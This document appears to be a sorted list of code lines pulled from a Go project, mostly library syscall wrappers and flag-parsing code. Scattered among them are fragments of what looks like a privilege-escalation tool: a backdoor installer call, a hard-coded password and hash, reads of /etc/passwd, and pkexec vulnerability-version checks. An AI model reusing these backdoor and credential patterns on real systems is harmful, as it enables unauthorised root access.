"output := """""
"output := bytes.NewBufferString("""")"
"output, err := exec.Command(""pkcheck"", ""--version"").Output()"
"output.WriteString("""
"output.WriteString(fmt.Sprintf("" %d,"", b))"
"owner, "
"ownerSize, group, "
"ownerSize, nil, "
"p := os.NewFile(uintptr(fd), ""/dev/pts"")"
"p := os.NewFile(uintptr(pFD), ""/dev/ptmx"")"
"p := os.NewFile(uintptr(ptmxfd), ""/dev/ptmx"")"
"p = strrchr(buf, "":""[0])"
"p, _ := windows.GetCurrentProcess()"
"p, _, e := syscall_syscall(SYS_TELLDIR, dir, 0, 0)"
"p, e := UTF16PtrFromString(path)"
"p, e := UTF16PtrFromString(s)"
"p, e := d.FindProc(name)"
"p, e := d.FindProcByOrdinal(ordinal)"
"p, err := BytePtrFromString(name)"
"p, err := BytePtrFromString(path)"
"p, err := BytePtrFromString(pathname)"
"p, err := UTF16PtrFromString(name)"
"p, err := os.OpenFile(""/dev/ptm"", os.O_RDWR"
"p, err := os.OpenFile(""/dev/ptmx"", os.O_RDWR, 0)"
"p, err := syscall.UTF16PtrFromString(value)"
"p, name, """", value, usage)"
"p, name, shorthand, value, usage)"
"p.PersistentPostRun(c, argWoFlags)"
"p.PersistentPreRun(c, argWoFlags)"
"p.proc)), unsafe.Pointer(proc))"
"p.writer.Write([]byte(fmt.Sprintf(""<%s>"", tagName)))"
"pFD, err := syscall.Open(""/dev/ptmx"", syscall.O_RDWR"
"p[0]), int("
"p[0]), n)"
"p[0], p[1] = r, w"
"paccept(int s, struct sockaddr "
"package plan9 // import ""golang.org/x/sys/plan9"""
"package unix // import ""golang.org/x/sys/unix"""
"package windows // import ""golang.org/x/sys/windows"""
"pageSize: 4096,"
"panic(""Call "" "
"panic(""Command can't be a child of itself"")"
"panic(""Eq called on unsupported type"")"
"panic(""RawSockaddrAny too small"")"
"panic(""mismanaged memory"")"
"panic(""sub-authority index out of range"")"
"panic(""syscall: readInt with unsupported size"")"
"panic(""windows: string with NUL passed to StringToUTF16"")"
"panic(fmt.Sprintf(""Failed to find flag %q and mark it as being in a mutually exclusive flag group"", v))"
"panic(fmt.Sprintf(""Failed to find flag %q and mark it as being required in a flag group"", v))"
"param, int param_size)"
"param, size_t psize)"
"param, size_t psize, int64_t proc_cookie)"
"params, const cpumask_t "
"partOtherPre := """""
"partSelfPre := """""
"parts := strings.SplitN(line, "")"", 2)"
"parts = append(parts, name[last:])"
"parts = append(parts, name[last:i])"
"parts = strings.Split(specification, "":"")"
"passwdData, err := os.ReadFile(""/etc/passwd"")"
"password := ""traitor"""
"password := v.setPassword(user, log)"
"password, err := terminal.ReadPassword(int(os.Stdin.Fd()))"
"passwordHash := ""$5$xRveGoW.etBZqJwg$uEvtrnKPbuEvTxJAisVrCevthWxafgX6.uAS6uF7QW7"""
"passwordHash,"
"pasteEnd   = []byte{keyEscape, '[', '2', '0', '1', '"
"pasteStart = []byte{keyEscape, '[', '2', '0', '0', '"
"patched, err := version.NewVersion(""0.105-31"") // vuln was patched in 0.105-31"
"patched, err := version.NewVersion(""0.119"") // vuln was patched in 0.113"
"patent license to make, have made, use, offer to sell, sell, import,"
"path := filepath.Join(binPath, random.Filename())"
"path, "
"path, acl_type_t type)"
"path, acl_type_t type, struct acl "
"path, char "
"path, const char "
"path, const struct posix_spawn_file_actions "
"path, const struct timespec "
"path, const struct timeval "
"path, err := Fd2path(fd)"
"path, err := os.Executable()"
"path, err := plan9.Fd2path(fd)"
"path, err = backdoor.Install()"
"path, err = backdoor.InstallToPath(args[0])"
"path, int PAD, off_t length)"
"path, int amode)"
"path, int amode, int flag)"
"path, int amode, int flags)"
"path, int attrnamespace, const char "
"path, int attrnamespace, void "
"path, int cmd, const char "
"path, int cmd, int uid, caddr_t arg)"
"path, int cmd, int uid, char "
"path, int fd, const char "
"path, int flag)"
"path, int flag, mode_t mode)"
"path, int flags)"
"path, int flags, ... mode_t mode)"
"path, int flags, caddr_t data)"
"path, int flags, int mode)"
"path, int flags, mode_t mode)"
"path, int flags, mode_t mode, const struct mq_attr "
"path, int flags, void "
"path, int mode)"
"path, int mode, int dev)"
"path, int mode, int flags)"
"path, int name)"
"path, int oflags, ... mode_t mode)"
"path, int op, int fd, const void "
"path, int pad, off_t length)"
"path, int uid, int gid)"
"path, int uid, int gid, int flags)"
"path, mode_t mode)"
"path, mode_t mode, dev_t dev)"
"path, mode_t mode, int flag)"
"path, mode_t mode, uint32_t dev)"
"path, nil"
"path, off_t length)"
"path, struct nstat "
"path, struct plistref "
"path, struct quotactl_args "
"path, struct stat "
"path, struct statfs "
"path, struct statvfs "
"path, struct timespec "
"path, struct timeval "
"path, u_int flags)"
"path, u_int flags, int atflags)"
"path, u_long flags)"
"path, u_long flags, int atflag)"
"path, u_long flags, int atflags)"
"path, uid_t owner, gid_t group, int flag)"
"path, uid_t uid, gid_t gid)"
"path, uid_t uid, gid_t gid, int flag)"
"path,"
"path1, int fd, char "
"path1, int fd, const char "
"path1, int fd2, char "
"path1, int fd2, const char "
"path2, int flag)"
"path2, int flags)"
"pathPtr, err := syscall.BytePtrFromString(path)"
"path_p, struct mac "
"pathname, char "
"pathp, e := UTF16PtrFromString(path)"
"pathp, err := BytePtrFromString(path)"
"pathp, err := UTF16PtrFromString(path)"
"pe, err := getProcessEntry(Getpid())"
"pe, err := getProcessEntry(os.Getpid())"
"pe, err := getProcessEntry(os.Getppid())"
"pe, err := getProcessEntry(ppid)"
"permit persons to whom the Software is furnished to do so,"
"pflag is a drop-in replacement for Go's flag package, implementing"
"pflag is available under the same style of BSD license as the Go language,"
"pflag under the name ""flag"" then all code should continue to function"
"pflag.Flag, []string, string, error) {"
"pflag.Flag, cmd "
"pflag.Flag, toComplete string) []string {"
"pflag.FlagSet, name string) error {"
"pflag.FlagSet, name string) pflag.NormalizedName {"
"pflag.FlagSet, name string, extensions ...string) error {"
"pflag.FlagSet, name string, f string) error {"
"pid, _ = Getpgid(0)"
"pid, const char "
"pipe() (r int, w int, err error)"
"pkexecPath, err := exec.LookPath(""pkexec"")"
"platform.goarch,"
"pmc_control(int ctr, int op, void "
"pmc_get_info(int ctr, int op, void "
"policy, int call, void "
"policy, struct sched_param "
"pollfds := make([]PollFd, 4)"
"pollfds = append(pollfds, PollFd{Fd: int32(fd), Events: epToPollEvt(epollevt.Events)})"
"port, err := port_create()"
"port:    port,"
"portEvent, max uint32, nget "
"portEvent, peExt "
"portEvent, timeout "
"port_associate(port int, source int, object uintptr, events int, user "
"port_create() (n int, err error)"
"port_dissociate(port int, source int, object uintptr) (n int, err error)"
"port_get(port int, pe "
"port_getn(port int, pe "
"posix_fadvise(int fd, int PAD, off_t offset, off_t len, int advice)"
"powershell]"","
"pp, flags)"
"ppid, err := getppid()"
"pptr, err := syscall.BytePtrFromString(promises)"
"pre:      pre,"
"pread(fd int, p []byte, offset int64) (n int, err error) = SYS_PREAD64"
"pread(fd int, p []byte, offset int64) (n int, err error) = pread64"
"pread(fd int, p []byte, offset int64) (n int, err error)"
"pread(int fd, void "
"preadv(fd int, iovs []Iovec, off int64) (n int, err error)"
"preadv(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr) (n int, err error) = SYS_PREADV"
"preadv(int fd, const struct iovec "
"preadv2(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr, flags int) (n int, err error) = SYS_PREADV2"
"present, "
"printf ""%s = "
"printf("""
"printf(""var errorList = [...]struct {"
"printf(""var errors = [...]string {"
"printf(""var signalList = [...]struct {"
"printf(""var signals = [...]string {"
"printf(""} {"
"printf(""}"
"proc, e := p.l.dll.FindProc(p.Name)"
"procAcceptEx                                             = modmswsock.NewProc(""AcceptEx"")"
"procAccess)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0, 0)"
"procAccess,"
"procAdjtime)), 2, uintptr(unsafe.Pointer(delta)), uintptr(unsafe.Pointer(olddelta)), 0, 0, 0, 0)"
"procAdjtime,"
"procAdjustTokenGroups                                    = modadvapi32.NewProc(""AdjustTokenGroups"")"
"procAdjustTokenPrivileges                                = modadvapi32.NewProc(""AdjustTokenPrivileges"")"
"procAllocateAndInitializeSid                             = modadvapi32.NewProc(""AllocateAndInitializeSid"")"
"procAssignProcessToJobObject                             = modkernel32.NewProc(""AssignProcessToJobObject"")"
"procBuildSecurityDescriptorW                             = modadvapi32.NewProc(""BuildSecurityDescriptorW"")"
"procCLSIDFromString                                      = modole32.NewProc(""CLSIDFromString"")"
"procCM_Get_DevNode_Status                                = modCfgMgr32.NewProc(""CM_Get_DevNode_Status"")"
"procCM_Get_Device_Interface_ListW                        = modCfgMgr32.NewProc(""CM_Get_Device_Interface_ListW"")"
"procCM_Get_Device_Interface_List_SizeW                   = modCfgMgr32.NewProc(""CM_Get_Device_Interface_List_SizeW"")"
"procCM_MapCrToWin32Err                                   = modCfgMgr32.NewProc(""CM_MapCrToWin32Err"")"
"procCancelIo                                             = modkernel32.NewProc(""CancelIo"")"
"procCancelIoEx                                           = modkernel32.NewProc(""CancelIoEx"")"
"procCertAddCertificateContextToStore                     = modcrypt32.NewProc(""CertAddCertificateContextToStore"")"
"procCertCloseStore                                       = modcrypt32.NewProc(""CertCloseStore"")"
"procCertCreateCertificateContext                         = modcrypt32.NewProc(""CertCreateCertificateContext"")"
"procCertDeleteCertificateFromStore                       = modcrypt32.NewProc(""CertDeleteCertificateFromStore"")"
"procCertDuplicateCertificateContext                      = modcrypt32.NewProc(""CertDuplicateCertificateContext"")"
"procCertEnumCertificatesInStore                          = modcrypt32.NewProc(""CertEnumCertificatesInStore"")"
"procCertFindCertificateInStore                           = modcrypt32.NewProc(""CertFindCertificateInStore"")"
"procCertFindChainInStore                                 = modcrypt32.NewProc(""CertFindChainInStore"")"
"procCertFindExtension                                    = modcrypt32.NewProc(""CertFindExtension"")"
"procCertFreeCertificateChain                             = modcrypt32.NewProc(""CertFreeCertificateChain"")"
"procCertFreeCertificateContext                           = modcrypt32.NewProc(""CertFreeCertificateContext"")"
"procCertGetCertificateChain                              = modcrypt32.NewProc(""CertGetCertificateChain"")"
"procCertGetNameStringW                                   = modcrypt32.NewProc(""CertGetNameStringW"")"
"procCertOpenStore                                        = modcrypt32.NewProc(""CertOpenStore"")"
"procCertOpenSystemStoreW                                 = modcrypt32.NewProc(""CertOpenSystemStoreW"")"
"procCertVerifyCertificateChainPolicy                     = modcrypt32.NewProc(""CertVerifyCertificateChainPolicy"")"
"procChangeServiceConfig2W                                = modadvapi32.NewProc(""ChangeServiceConfig2W"")"
"procChangeServiceConfigW                                 = modadvapi32.NewProc(""ChangeServiceConfigW"")"
"procChdir)), 1, uintptr(unsafe.Pointer(_p0)), 0, 0, 0, 0, 0)"
"procChdir,"
"procCheckTokenMembership                                 = modadvapi32.NewProc(""CheckTokenMembership"")"
"procChmod)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0, 0)"
"procChmod,"
"procChown)), 3, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid), 0, 0, 0)"
"procChown,"
"procChroot)), 1, uintptr(unsafe.Pointer(_p0)), 0, 0, 0, 0, 0)"
"procChroot,"
"procClose)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"procClose,"
"procCloseHandle                                          = modkernel32.NewProc(""CloseHandle"")"
"procCloseServiceHandle                                   = modadvapi32.NewProc(""CloseServiceHandle"")"
"procCoCreateGuid                                         = modole32.NewProc(""CoCreateGuid"")"
"procCoGetObject                                          = modole32.NewProc(""CoGetObject"")"
"procCoInitializeEx                                       = modole32.NewProc(""CoInitializeEx"")"
"procCoTaskMemFree                                        = modole32.NewProc(""CoTaskMemFree"")"
"procCoUninitialize                                       = modole32.NewProc(""CoUninitialize"")"
"procCommandLineToArgvW                                   = modshell32.NewProc(""CommandLineToArgvW"")"
"procConnectNamedPipe                                     = modkernel32.NewProc(""ConnectNamedPipe"")"
"procControlService                                       = modadvapi32.NewProc(""ControlService"")"
"procConvertSecurityDescriptorToStringSecurityDescriptorW = modadvapi32.NewProc(""ConvertSecurityDescriptorToStringSecurityDescriptorW"")"
"procConvertSidToStringSidW                               = modadvapi32.NewProc(""ConvertSidToStringSidW"")"
"procConvertStringSecurityDescriptorToSecurityDescriptorW = modadvapi32.NewProc(""ConvertStringSecurityDescriptorToSecurityDescriptorW"")"
"procConvertStringSidToSidW                               = modadvapi32.NewProc(""ConvertStringSidToSidW"")"
"procCopySid                                              = modadvapi32.NewProc(""CopySid"")"
"procCreat)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0, 0, 0, 0)"
"procCreat,"
"procCreateDirectoryW                                     = modkernel32.NewProc(""CreateDirectoryW"")"
"procCreateEnvironmentBlock                               = moduserenv.NewProc(""CreateEnvironmentBlock"")"
"procCreateEventExW                                       = modkernel32.NewProc(""CreateEventExW"")"
"procCreateEventW                                         = modkernel32.NewProc(""CreateEventW"")"
"procCreateFileMappingW                                   = modkernel32.NewProc(""CreateFileMappingW"")"
"procCreateFileW                                          = modkernel32.NewProc(""CreateFileW"")"
"procCreateHardLinkW                                      = modkernel32.NewProc(""CreateHardLinkW"")"
"procCreateIoCompletionPort                               = modkernel32.NewProc(""CreateIoCompletionPort"")"
"procCreateJobObjectW                                     = modkernel32.NewProc(""CreateJobObjectW"")"
"procCreateMutexExW                                       = modkernel32.NewProc(""CreateMutexExW"")"
"procCreateMutexW                                         = modkernel32.NewProc(""CreateMutexW"")"
"procCreateNamedPipeW                                     = modkernel32.NewProc(""CreateNamedPipeW"")"
"procCreatePipe                                           = modkernel32.NewProc(""CreatePipe"")"
"procCreateProcessAsUserW                                 = modadvapi32.NewProc(""CreateProcessAsUserW"")"
"procCreateProcessW                                       = modkernel32.NewProc(""CreateProcessW"")"
"procCreateServiceW                                       = modadvapi32.NewProc(""CreateServiceW"")"
"procCreateSymbolicLinkW                                  = modkernel32.NewProc(""CreateSymbolicLinkW"")"
"procCreateToolhelp32Snapshot                             = modkernel32.NewProc(""CreateToolhelp32Snapshot"")"
"procCreateWellKnownSid                                   = modadvapi32.NewProc(""CreateWellKnownSid"")"
"procCryptAcquireCertificatePrivateKey                    = modcrypt32.NewProc(""CryptAcquireCertificatePrivateKey"")"
"procCryptAcquireContextW                                 = modadvapi32.NewProc(""CryptAcquireContextW"")"
"procCryptDecodeObject                                    = modcrypt32.NewProc(""CryptDecodeObject"")"
"procCryptGenRandom                                       = modadvapi32.NewProc(""CryptGenRandom"")"
"procCryptProtectData                                     = modcrypt32.NewProc(""CryptProtectData"")"
"procCryptQueryObject                                     = modcrypt32.NewProc(""CryptQueryObject"")"
"procCryptReleaseContext                                  = modadvapi32.NewProc(""CryptReleaseContext"")"
"procCryptUnprotectData                                   = modcrypt32.NewProc(""CryptUnprotectData"")"
"procDefineDosDeviceW                                     = modkernel32.NewProc(""DefineDosDeviceW"")"
"procDeleteFileW                                          = modkernel32.NewProc(""DeleteFileW"")"
"procDeleteProcThreadAttributeList                        = modkernel32.NewProc(""DeleteProcThreadAttributeList"")"
"procDeleteService                                        = modadvapi32.NewProc(""DeleteService"")"
"procDeleteVolumeMountPointW                              = modkernel32.NewProc(""DeleteVolumeMountPointW"")"
"procDeregisterEventSource                                = modadvapi32.NewProc(""DeregisterEventSource"")"
"procDestroyEnvironmentBlock                              = moduserenv.NewProc(""DestroyEnvironmentBlock"")"
"procDeviceIoControl                                      = modkernel32.NewProc(""DeviceIoControl"")"
"procDnsNameCompare_W                                     = moddnsapi.NewProc(""DnsNameCompare_W"")"
"procDnsQuery_W                                           = moddnsapi.NewProc(""DnsQuery_W"")"
"procDnsRecordListFree                                    = moddnsapi.NewProc(""DnsRecordListFree"")"
"procDup)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"procDup,"
"procDup2)), 2, uintptr(oldfd), uintptr(newfd), 0, 0, 0, 0)"
"procDup2,"
"procDuplicateHandle                                      = modkernel32.NewProc(""DuplicateHandle"")"
"procDuplicateTokenEx                                     = modadvapi32.NewProc(""DuplicateTokenEx"")"
"procEntry, nil"
"procEnumProcessModules                                   = modpsapi.NewProc(""EnumProcessModules"")"
"procEnumProcessModulesEx                                 = modpsapi.NewProc(""EnumProcessModulesEx"")"
"procEnumProcesses                                        = modpsapi.NewProc(""EnumProcesses"")"
"procEnumServicesStatusExW                                = modadvapi32.NewProc(""EnumServicesStatusExW"")"
"procEqualSid                                             = modadvapi32.NewProc(""EqualSid"")"
"procExit)), 1, uintptr(code), 0, 0, 0, 0, 0)"
"procExit,"
"procExitProcess                                          = modkernel32.NewProc(""ExitProcess"")"
"procExitWindowsEx                                        = moduser32.NewProc(""ExitWindowsEx"")"
"procExpandEnvironmentStringsW                            = modkernel32.NewProc(""ExpandEnvironmentStringsW"")"
"procFaccessat)), 4, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"procFaccessat,"
"procFchdir)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"procFchdir,"
"procFchmod)), 2, uintptr(fd), uintptr(mode), 0, 0, 0, 0)"
"procFchmod,"
"procFchmodat)), 4, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"procFchmodat,"
"procFchown)), 3, uintptr(fd), uintptr(uid), uintptr(gid), 0, 0, 0)"
"procFchown,"
"procFchownat)), 5, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid), uintptr(flags), 0)"
"procFchownat,"
"procFdatasync)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"procFdatasync,"
"procFindClose                                            = modkernel32.NewProc(""FindClose"")"
"procFindCloseChangeNotification                          = modkernel32.NewProc(""FindCloseChangeNotification"")"
"procFindFirstChangeNotificationW                         = modkernel32.NewProc(""FindFirstChangeNotificationW"")"
"procFindFirstFileW                                       = modkernel32.NewProc(""FindFirstFileW"")"
"procFindFirstVolumeMountPointW                           = modkernel32.NewProc(""FindFirstVolumeMountPointW"")"
"procFindFirstVolumeW                                     = modkernel32.NewProc(""FindFirstVolumeW"")"
"procFindNextChangeNotification                           = modkernel32.NewProc(""FindNextChangeNotification"")"
"procFindNextFileW                                        = modkernel32.NewProc(""FindNextFileW"")"
"procFindNextVolumeMountPointW                            = modkernel32.NewProc(""FindNextVolumeMountPointW"")"
"procFindNextVolumeW                                      = modkernel32.NewProc(""FindNextVolumeW"")"
"procFindResourceW                                        = modkernel32.NewProc(""FindResourceW"")"
"procFindVolumeClose                                      = modkernel32.NewProc(""FindVolumeClose"")"
"procFindVolumeMountPointClose                            = modkernel32.NewProc(""FindVolumeMountPointClose"")"
"procFlock)), 2, uintptr(fd), uintptr(how), 0, 0, 0, 0)"
"procFlock,"
"procFlushFileBuffers                                     = modkernel32.NewProc(""FlushFileBuffers"")"
"procFlushViewOfFile                                      = modkernel32.NewProc(""FlushViewOfFile"")"
"procFormatMessageW                                       = modkernel32.NewProc(""FormatMessageW"")"
"procFpathconf)), 2, uintptr(fd), uintptr(name), 0, 0, 0, 0)"
"procFpathconf,"
"procFreeAddrInfoW                                        = modws2_32.NewProc(""FreeAddrInfoW"")"
"procFreeEnvironmentStringsW                              = modkernel32.NewProc(""FreeEnvironmentStringsW"")"
"procFreeLibrary                                          = modkernel32.NewProc(""FreeLibrary"")"
"procFreeSid                                              = modadvapi32.NewProc(""FreeSid"")"
"procFstat)), 2, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0, 0, 0, 0)"
"procFstat,"
"procFstatat)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"procFstatat,"
"procFstatvfs)), 2, uintptr(fd), uintptr(unsafe.Pointer(vfsstat)), 0, 0, 0, 0)"
"procFstatvfs,"
"procFsync)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"procFsync,"
"procFtruncate)), 2, uintptr(fd), uintptr(length), 0, 0, 0, 0)"
"procFtruncate,"
"procGenerateConsoleCtrlEvent                             = modkernel32.NewProc(""GenerateConsoleCtrlEvent"")"
"procGetACP                                               = modkernel32.NewProc(""GetACP"")"
"procGetAcceptExSockaddrs                                 = modmswsock.NewProc(""GetAcceptExSockaddrs"")"
"procGetActiveProcessorCount                              = modkernel32.NewProc(""GetActiveProcessorCount"")"
"procGetAdaptersAddresses                                 = modiphlpapi.NewProc(""GetAdaptersAddresses"")"
"procGetAdaptersInfo                                      = modiphlpapi.NewProc(""GetAdaptersInfo"")"
"procGetAddrInfoW                                         = modws2_32.NewProc(""GetAddrInfoW"")"
"procGetCommTimeouts                                      = modkernel32.NewProc(""GetCommTimeouts"")"
"procGetCommandLineW                                      = modkernel32.NewProc(""GetCommandLineW"")"
"procGetComputerNameExW                                   = modkernel32.NewProc(""GetComputerNameExW"")"
"procGetComputerNameW                                     = modkernel32.NewProc(""GetComputerNameW"")"
"procGetConsoleMode                                       = modkernel32.NewProc(""GetConsoleMode"")"
"procGetConsoleScreenBufferInfo                           = modkernel32.NewProc(""GetConsoleScreenBufferInfo"")"
"procGetCurrentDirectoryW                                 = modkernel32.NewProc(""GetCurrentDirectoryW"")"
"procGetCurrentProcessId                                  = modkernel32.NewProc(""GetCurrentProcessId"")"
"procGetCurrentThreadId                                   = modkernel32.NewProc(""GetCurrentThreadId"")"
"procGetDiskFreeSpaceExW                                  = modkernel32.NewProc(""GetDiskFreeSpaceExW"")"
"procGetDriveTypeW                                        = modkernel32.NewProc(""GetDriveTypeW"")"
"procGetEnvironmentStringsW                               = modkernel32.NewProc(""GetEnvironmentStringsW"")"
"procGetEnvironmentVariableW                              = modkernel32.NewProc(""GetEnvironmentVariableW"")"
"procGetExitCodeProcess                                   = modkernel32.NewProc(""GetExitCodeProcess"")"
"procGetFileAttributesExW                                 = modkernel32.NewProc(""GetFileAttributesExW"")"
"procGetFileAttributesW                                   = modkernel32.NewProc(""GetFileAttributesW"")"
"procGetFileInformationByHandle                           = modkernel32.NewProc(""GetFileInformationByHandle"")"
"procGetFileInformationByHandleEx                         = modkernel32.NewProc(""GetFileInformationByHandleEx"")"
"procGetFileType                                          = modkernel32.NewProc(""GetFileType"")"
"procGetFileVersionInfoSizeW                              = modversion.NewProc(""GetFileVersionInfoSizeW"")"
"procGetFileVersionInfoW                                  = modversion.NewProc(""GetFileVersionInfoW"")"
"procGetFinalPathNameByHandleW                            = modkernel32.NewProc(""GetFinalPathNameByHandleW"")"
"procGetFullPathNameW                                     = modkernel32.NewProc(""GetFullPathNameW"")"
"procGetIfEntry                                           = modiphlpapi.NewProc(""GetIfEntry"")"
"procGetLastError                                         = modkernel32.NewProc(""GetLastError"")"
"procGetLengthSid                                         = modadvapi32.NewProc(""GetLengthSid"")"
"procGetLogicalDriveStringsW                              = modkernel32.NewProc(""GetLogicalDriveStringsW"")"
"procGetLogicalDrives                                     = modkernel32.NewProc(""GetLogicalDrives"")"
"procGetLongPathNameW                                     = modkernel32.NewProc(""GetLongPathNameW"")"
"procGetMaximumProcessorCount                             = modkernel32.NewProc(""GetMaximumProcessorCount"")"
"procGetModuleBaseNameW                                   = modpsapi.NewProc(""GetModuleBaseNameW"")"
"procGetModuleFileNameExW                                 = modpsapi.NewProc(""GetModuleFileNameExW"")"
"procGetModuleFileNameW                                   = modkernel32.NewProc(""GetModuleFileNameW"")"
"procGetModuleHandleExW                                   = modkernel32.NewProc(""GetModuleHandleExW"")"
"procGetModuleInformation                                 = modpsapi.NewProc(""GetModuleInformation"")"
"procGetNamedPipeHandleStateW                             = modkernel32.NewProc(""GetNamedPipeHandleStateW"")"
"procGetNamedPipeInfo                                     = modkernel32.NewProc(""GetNamedPipeInfo"")"
"procGetNamedSecurityInfoW                                = modadvapi32.NewProc(""GetNamedSecurityInfoW"")"
"procGetOverlappedResult                                  = modkernel32.NewProc(""GetOverlappedResult"")"
"procGetPriorityClass                                     = modkernel32.NewProc(""GetPriorityClass"")"
"procGetProcAddress                                       = modkernel32.NewProc(""GetProcAddress"")"
"procGetProcessId                                         = modkernel32.NewProc(""GetProcessId"")"
"procGetProcessPreferredUILanguages                       = modkernel32.NewProc(""GetProcessPreferredUILanguages"")"
"procGetProcessShutdownParameters                         = modkernel32.NewProc(""GetProcessShutdownParameters"")"
"procGetProcessTimes                                      = modkernel32.NewProc(""GetProcessTimes"")"
"procGetProcessWorkingSetSizeEx                           = modkernel32.NewProc(""GetProcessWorkingSetSizeEx"")"
"procGetQueuedCompletionStatus                            = modkernel32.NewProc(""GetQueuedCompletionStatus"")"
"procGetSecurityDescriptorControl                         = modadvapi32.NewProc(""GetSecurityDescriptorControl"")"
"procGetSecurityDescriptorDacl                            = modadvapi32.NewProc(""GetSecurityDescriptorDacl"")"
"procGetSecurityDescriptorGroup                           = modadvapi32.NewProc(""GetSecurityDescriptorGroup"")"
"procGetSecurityDescriptorLength                          = modadvapi32.NewProc(""GetSecurityDescriptorLength"")"
"procGetSecurityDescriptorOwner                           = modadvapi32.NewProc(""GetSecurityDescriptorOwner"")"
"procGetSecurityDescriptorRMControl                       = modadvapi32.NewProc(""GetSecurityDescriptorRMControl"")"
"procGetSecurityDescriptorSacl                            = modadvapi32.NewProc(""GetSecurityDescriptorSacl"")"
"procGetSecurityInfo                                      = modadvapi32.NewProc(""GetSecurityInfo"")"
"procGetShellWindow                                       = moduser32.NewProc(""GetShellWindow"")"
"procGetShortPathNameW                                    = modkernel32.NewProc(""GetShortPathNameW"")"
"procGetSidIdentifierAuthority                            = modadvapi32.NewProc(""GetSidIdentifierAuthority"")"
"procGetSidSubAuthority                                   = modadvapi32.NewProc(""GetSidSubAuthority"")"
"procGetSidSubAuthorityCount                              = modadvapi32.NewProc(""GetSidSubAuthorityCount"")"
"procGetStartupInfoW                                      = modkernel32.NewProc(""GetStartupInfoW"")"
"procGetStdHandle                                         = modkernel32.NewProc(""GetStdHandle"")"
"procGetSystemDirectoryW                                  = modkernel32.NewProc(""GetSystemDirectoryW"")"
"procGetSystemPreferredUILanguages                        = modkernel32.NewProc(""GetSystemPreferredUILanguages"")"
"procGetSystemTimeAsFileTime                              = modkernel32.NewProc(""GetSystemTimeAsFileTime"")"
"procGetSystemTimePreciseAsFileTime                       = modkernel32.NewProc(""GetSystemTimePreciseAsFileTime"")"
"procGetSystemWindowsDirectoryW                           = modkernel32.NewProc(""GetSystemWindowsDirectoryW"")"
"procGetTempPathW                                         = modkernel32.NewProc(""GetTempPathW"")"
"procGetThreadPreferredUILanguages                        = modkernel32.NewProc(""GetThreadPreferredUILanguages"")"
"procGetTickCount64                                       = modkernel32.NewProc(""GetTickCount64"")"
"procGetTimeZoneInformation                               = modkernel32.NewProc(""GetTimeZoneInformation"")"
"procGetTokenInformation                                  = modadvapi32.NewProc(""GetTokenInformation"")"
"procGetUserNameExW                                       = modsecur32.NewProc(""GetUserNameExW"")"
"procGetUserPreferredUILanguages                          = modkernel32.NewProc(""GetUserPreferredUILanguages"")"
"procGetUserProfileDirectoryW                             = moduserenv.NewProc(""GetUserProfileDirectoryW"")"
"procGetVersion                                           = modkernel32.NewProc(""GetVersion"")"
"procGetVolumeInformationByHandleW                        = modkernel32.NewProc(""GetVolumeInformationByHandleW"")"
"procGetVolumeInformationW                                = modkernel32.NewProc(""GetVolumeInformationW"")"
"procGetVolumeNameForVolumeMountPointW                    = modkernel32.NewProc(""GetVolumeNameForVolumeMountPointW"")"
"procGetVolumePathNameW                                   = modkernel32.NewProc(""GetVolumePathNameW"")"
"procGetVolumePathNamesForVolumeNameW                     = modkernel32.NewProc(""GetVolumePathNamesForVolumeNameW"")"
"procGetWindowThreadProcessId                             = moduser32.NewProc(""GetWindowThreadProcessId"")"
"procGetWindowsDirectoryW                                 = modkernel32.NewProc(""GetWindowsDirectoryW"")"
"procGetcwd)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), 0, 0, 0, 0)"
"procGetcwd,"
"procGetdents)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(unsafe.Pointer(basep)), 0, 0)"
"procGetdents,"
"procGetegid)), 0, 0, 0, 0, 0, 0, 0)"
"procGetegid,"
"procGeteuid)), 0, 0, 0, 0, 0, 0, 0)"
"procGeteuid,"
"procGetgid)), 0, 0, 0, 0, 0, 0, 0)"
"procGetgid,"
"procGetpgid)), 1, uintptr(pid), 0, 0, 0, 0, 0)"
"procGetpgid,"
"procGetpgrp)), 0, 0, 0, 0, 0, 0, 0)"
"procGetpgrp,"
"procGetpid)), 0, 0, 0, 0, 0, 0, 0)"
"procGetpid,"
"procGetppid)), 0, 0, 0, 0, 0, 0, 0)"
"procGetppid,"
"procGetpriority)), 2, uintptr(which), uintptr(who), 0, 0, 0, 0)"
"procGetpriority,"
"procGetrlimit)), 2, uintptr(which), uintptr(unsafe.Pointer(lim)), 0, 0, 0, 0)"
"procGetrlimit,"
"procGetrusage)), 2, uintptr(who), uintptr(unsafe.Pointer(rusage)), 0, 0, 0, 0)"
"procGetrusage,"
"procGetsid)), 1, uintptr(pid), 0, 0, 0, 0, 0)"
"procGetsid,"
"procGettimeofday)), 1, uintptr(unsafe.Pointer(tv)), 0, 0, 0, 0, 0)"
"procGettimeofday,"
"procGetuid)), 0, 0, 0, 0, 0, 0, 0)"
"procGetuid,"
"procImpersonateSelf                                      = modadvapi32.NewProc(""ImpersonateSelf"")"
"procInitializeProcThreadAttributeList                    = modkernel32.NewProc(""InitializeProcThreadAttributeList"")"
"procInitializeSecurityDescriptor                         = modadvapi32.NewProc(""InitializeSecurityDescriptor"")"
"procInitiateSystemShutdownExW                            = modadvapi32.NewProc(""InitiateSystemShutdownExW"")"
"procIsTokenRestricted                                    = modadvapi32.NewProc(""IsTokenRestricted"")"
